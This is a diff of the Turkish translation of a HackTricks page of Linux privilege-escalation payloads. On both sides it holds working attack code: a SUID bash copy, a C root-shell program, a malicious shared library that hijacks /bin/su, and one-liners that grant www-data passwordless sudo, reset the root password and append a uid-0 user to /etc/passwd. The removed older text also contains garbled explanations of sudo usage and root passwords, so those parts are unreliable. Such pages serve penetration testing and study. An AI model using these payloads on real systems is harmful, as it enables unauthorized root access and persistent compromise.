@@ -1,89 +1,26 @@
 # Yürütülecek Payloadlar
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 ## Bash
 ```bash
 cp /bin/bash /tmp/b && chmod +s /tmp/b
 /bin/b -p #Maintains root privileges from suid, working in debian & buntu
 ```
-## Yürütülecek Yükler
-
-Bu bölümde, bir hedef sistemde ayrıcalık yükseltmek için kullanılabilecek bazı yaygın yükleri bulacaksınız. Bu yükler, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken daha yüksek ayrıcalıklara erişim sağlamak için kullanılabilir.
-
-### 1. Sudo Kullanıcı Parolası İsteme
-
-Bu yük, hedef sistemde sudo ayrıcalıklarına sahip bir kullanıcının parolasını istemek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken sudo komutlarını çalıştırabilirsiniz.
-
-```bash
-sudo -S command
-```
-
-### 2. Sudo Kullanıcı Parolası Olmadan
-
-Bu yük, hedef sistemde sudo ayrıcalıklarına sahip bir kullanıcının parolasını girmeden sudo komutlarını çalıştırmak için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken sudo komutlarını çalıştırabilirsiniz.
-
-```bash
-sudo -n command
-```
-
-### 3. Sudo Kullanıcı Parolası İsteme (Root Olarak)
-
-Bu yük, hedef sistemde root ayrıcalıklarına sahip bir kullanıcının parolasını istemek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken root ayrıcalıklarına erişim sağlayabilirsiniz.
-
-```bash
-sudo -S su
-```
-
-### 4. Sudo Kullanıcı Parolası Olmadan (Root Olarak)
-
-Bu yük, hedef sistemde root ayrıcalıklarına sahip bir kullanıcının parolasını girmeden root ayrıcalıklarına erişmek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken root ayrıcalıklarına erişim sağlayabilirsiniz.
-
-```bash
-sudo -n su
-```
-
-### 5. Sudo Kullanıcı Parolası İsteme (Diğer Kullanıcı Olarak)
-
-Bu yük, hedef sistemde belirli bir kullanıcının parolasını istemek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken belirli bir kullanıcının ayrıcalıklarına erişim sağlayabilirsiniz.
-
-```bash
-sudo -S -u username command
-```
-
-### 6. Sudo Kullanıcı Parolası Olmadan (Diğer Kullanıcı Olarak)
-
-Bu yük, hedef sistemde belirli bir kullanıcının parolasını girmeden belirli bir kullanıcının ayrıcalıklarına erişmek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken belirli bir kullanıcının ayrıcalıklarına erişim sağlayabilirsiniz.
-
-```bash
-sudo -n -u username command
-```
-
-### 7. Sudo Kullanıcı Parolası İsteme (Diğer Kullanıcı Olarak, Root Olarak)
-
-Bu yük, hedef sistemde belirli bir kullanıcının parolasını istemek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken belirli bir kullanıcının root ayrıcalıklarına erişim sağlayabilirsiniz.
-
-```bash
-sudo -S -u username su
-```
-
-### 8. Sudo Kullanıcı Parolası Olmadan (Diğer Kullanıcı Olarak, Root Olarak)
-
-Bu yük, hedef sistemde belirli bir kullanıcının parolasını girmeden belirli bir kullanıcının root ayrıcalıklarına erişmek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken belirli bir kullanıcının root ayrıcalıklarına erişim sağlayabilirsiniz.
-
-```bash
-sudo -n -u username su
-```
+## C
 ```c
 //gcc payload.c -o payload
 int main(void){
@@ -120,18 +57,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Yetkileri yükseltmek için bir dosyayı üzerine yazma
+## Yetkileri artırmak için bir dosyayı üzerine yazma
 
 ### Yaygın dosyalar
 
-* Şifreli kullanıcıyı _/etc/passwd_ dosyasına ekle
-* Şifreyi _/etc/shadow_ dosyasında değiştir
-* Kullanıcıyı _/etc/sudoers_ dosyasına ekle
-* Docker soketi üzerinden docker'ı kötüye kullan, genellikle _/run/docker.sock_ veya _/var/run/docker.sock_ içerisindedir
+* _/etc/passwd_ dosyasına şifreli kullanıcı ekle
+* _/etc/shadow_ dosyasında şifreyi değiştir
+* _/etc/sudoers_ dosyasına kullanıcı ekle
+* Genellikle _/run/docker.sock_ veya _/var/run/docker.sock_ içinde bulunan docker soketini kötüye kullan
 
 ### Bir kütüphaneyi üzerine yazma
 
-Bazı ikili dosyalar tarafından kullanılan bir kütüphaneyi kontrol et, bu durumda `/bin/su`:
+Bu durumda `/bin/su` olan bazı ikili dosyalar tarafından kullanılan bir kütüphaneyi kontrol et:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -143,8 +80,8 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-Bu durumda `/lib/x86_64-linux-gnu/libaudit.so.1`'i taklit etmeyi deneyelim.\
-Bu kütüphanenin **`su`** ikilisi tarafından kullanılan işlevlerini kontrol edin:
+Bu durumda `/lib/x86_64-linux-gnu/libaudit.so.1` dosyasını taklit etmeye çalışalım.\
+Bu kütüphanenin **`su`** ikili dosyası tarafından kullanılan fonksiyonlarını kontrol edin:
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -152,7 +89,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Semboller `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` ve `audit_fd` muhtemelen libaudit.so.1 kütüphanesinden gelmektedir. Zararlı paylaşılan kütüphane tarafından üzerine yazılacağı için, bu semboller yeni paylaşılan kütüphanede bulunmalıdır. Aksi takdirde, program sembolü bulamayacak ve sonlanacaktır.
+The symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` ve `audit_fd` muhtemelen libaudit.so.1 kütüphanesindendir. libaudit.so.1 kötü niyetli paylaşılan kütüphane tarafından üzerine yazılacağından, bu semboller yeni paylaşılan kütüphanede mevcut olmalıdır, aksi takdirde program sembolü bulamayacak ve çıkacaktır.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -174,52 +111,35 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Şimdi, sadece **`/bin/su`** çağırarak kök olarak bir kabuk elde edeceksiniz.
+Şimdi, sadece **`/bin/su`** çağırarak root olarak bir shell elde edebilirsiniz.
 
-## Betikler
+## Scriptler
 
-Kök kullanıcı bir şeyi çalıştırabilir mi?
+Root'un bir şey çalıştırmasını sağlayabilir misiniz?
 
-### **www-data için sudoers**
+### **www-data sudoers'a**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **Root şifresini değiştirme**
-
-Root şifresini değiştirmek, bir sistemdeki root kullanıcısının şifresini güncellemek anlamına gelir. Bu, kötü niyetli bir saldırganın root erişimine sahip olmasını engellemek için önemli bir adımdır. Root şifresini değiştirmek için aşağıdaki adımları izleyebilirsiniz:
-
-1. Terminali açın ve root kullanıcısına geçiş yapın:
-   ```bash
-   sudo su
-   ```
-
-2. Yeni bir root şifresi belirleyin:
-   ```bash
-   passwd
-   ```
-
-3. Yeni şifreyi girin ve onaylayın.
-
-Artık root şifresi değiştirildi ve güncel şifre ile root erişimine sahip olabilirsiniz.
+### **Root şifresini değiştir**
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### /etc/passwd'ye yeni bir kök kullanıcı ekleyin
-
-```bash
-echo 'newroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd
-```
+### Yeni root kullanıcısı ekle /etc/passwd
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
